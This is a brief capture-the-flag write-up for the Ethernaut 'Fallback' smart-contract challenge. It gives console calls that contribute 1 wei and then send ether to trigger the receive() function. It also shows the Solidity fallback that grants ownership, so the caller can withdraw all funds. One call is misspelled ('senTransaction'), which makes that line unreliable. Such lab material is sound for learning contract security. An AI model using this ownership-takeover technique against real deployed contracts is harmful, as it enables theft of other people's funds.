# Level 1
## Fallback challenge
```JavaScript
await contract.contribute({value: 1});
await contract.senTransaction({value: 1 });
await contract.owner();
```
```Solidity
 /** 
 @notice This fallback function receive() is the main attack target, in order to pass the 
  require statement player must use function contribute() 1 wei will be enough, using the console
  player calls await contract.contribute({value: 1}), then player calls await contract.sendTransaction({value: 1}),
  player can verify ownership with await contract.owner(), player will now be able to withdraw all tokens 
  */
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender; 
  }
  ```
  
